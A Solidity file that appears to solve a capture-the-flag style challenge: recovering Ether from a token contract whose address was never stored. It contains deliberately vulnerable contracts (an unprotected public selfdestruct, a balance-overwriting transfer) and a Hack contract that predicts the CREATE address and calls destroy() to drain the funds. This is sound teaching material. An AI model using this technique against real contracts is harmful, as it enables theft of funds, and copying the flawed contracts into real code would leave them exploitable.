// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goal: recover 0.001 ETH from lost contract address
// Lesson: Understanding how contracts are deployed and how their addresses are determined 
// is fundamental to interacting with and securing smart contracts.

// How to run?
// 1. Deploy recovery contract
// 2. Call generateToken() function
// SimpleToken contract is deployed dynamically within the generateToken function 
// And we dont store deployed instance and its address

// Recovery contract deploys SimpleToken
// Creating new instance of the SimpleToken contract.
// Only function is to deploy a new SimpleToken contract with a specified initial supply
contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

// The SimpleToken contract defines a basic ERC-20-like token that can be traded by
// sending Ether to the contract (which gives tokens to the sender) and allows for token transfers. 
contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // This contract is deployed using CREATE and, the address of the newly deployed contract 
    // is determined by the sender’s address (the address deploying the contract) and the nonce of the sender 
    // address = keccak256(rlp.encode([sender, nonce]))[12:]


    // collect ether in return for tokens
    receive() external payable {
        //balances[msg.sender] = msg.value * 10; // Here the ETH was send
        balances[msg.sender] = msg.value * 10; // Here the ETH was send
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        // Potential vulnerability? overwrites the recipient's balance rather than 
        // adding the transferred tokens to their existing balance. 
        // It should be balances[_to] += _amount; to add the transferred tokens.
        balances[_to] = _amount;
    }


    // clean up after ourselves...vulnerability:
    // This destroy function is public and can be called by everyone
    // We need the address of the contract: (1) by Remix? or (2) calculate?
    function destroy(address payable _to) public payable {
        selfdestruct(_to);
    }
}

// 1st retrieve the address of the token
// 2nd use destroy() to get the Ether back
contract Hack {

    Recovery public hack;

    address public contractAddress;


    constructor (address _recoveryAddress)  {
        hack = Recovery(_recoveryAddress);
    }


   function recoverAddress() external payable {
        // The address of the Recovery contract (sender address)
        address sender = address(hack);
        
        // Assume first deployment (nonce = 0) or second deployment (nonce = 1)
        //uint nonce = 0; // Start with nonce 0
        
        // Try predicting the address using nonce 0
        //bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01), nonce));
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)));
        contractAddress = address(uint160(uint256(hash)));

        // Check if the address is valid by interacting with it (simple check)
        if (contractAddress == address(0)) {
            revert("Invalid address prediction.");
        }
    }



    // Attack function to destroy the SimpleToken contract
    // Calling the attack function is not working: do it manually
    // Load contract simpletoken instance from address and call destroy function manually
    function attack() external payable {
        // Ensure that the SimpleToken contract address has been recovered
        require(contractAddress != address(0), "SimpleToken address not set");

        // Interact with the SimpleToken contract and call its destroy() function
        SimpleToken simpleToken = SimpleToken(payable(contractAddress));
        simpleToken.destroy(payable(msg.sender));
        //simpleToken.destroy(payable("0x5B38Da6a701c568545dCfcB03FcB875f56beddC4");
    }
}

